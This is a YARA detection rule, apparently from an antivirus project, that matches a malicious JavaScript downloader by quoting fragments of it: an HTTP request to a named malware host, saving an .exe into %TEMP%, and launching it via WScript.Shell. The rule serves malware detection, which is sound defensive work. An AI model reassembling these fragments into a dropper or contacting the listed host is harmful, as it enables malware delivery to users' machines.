rule sig_20160329_d9c547d943f3133f04bfd019dae1d029 {
  meta:
    description = "datamaliciousorder - file 20160329_d9c547d943f3133f04bfd019dae1d029.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c2d0dfe0ef61d975bb8b0073e3b17aa8353aa92b036f5c69700b73cb4e0239f6"

  strings:
    $s1  = "b0[W](\"GET\", \"http://shippedmedicalsupplies.com/n5ids\", false);" fullword ascii
    $s2  = "function Px() {return Np[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Bp6nmgkMDFbsNSSO.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[uW](Eh() * 11); if (b0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function N(z0, Jx){cR = cR * 1; return z0 - Jx;};" fullword ascii
    $s5  = "var Np = function bD() {return WScript[Qz](\"WScript.Shell\");}(), T = 11;" fullword ascii
    $s6  = "function s(){return \"\" + iw;};" fullword ascii
    $s7  = "function z() {return ((Y == true) && (Y == oB)) ? 1 : cR;};" fullword ascii
    $s8  = "function K(iw0){Np[\"Run\"](iw0, cR, cR);};" fullword ascii
    $s9  = "function Z()" fullword ascii
    $s10 = " while (Rp){" fullword ascii
    $s11 = "var F = new this[\"Date\"]();" fullword ascii
    $s12 = "function Eh(){return 22;};" fullword ascii
    $s13 = "return N(X, bw);" fullword ascii
    $s14 = "function Lj(){return Qz;};" fullword ascii
    $s15 = "function Gf(ZN) {var M = (1, 2, 3, 4, 5, ZN); return M;};" fullword ascii
    $s16 = "var B = false;" fullword ascii
    $s17 = "Y = true; " fullword ascii
    $s18 = "var Y = false;" fullword ascii
    $s19 = "var oB = false;" fullword ascii
    $s20 = "oB = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}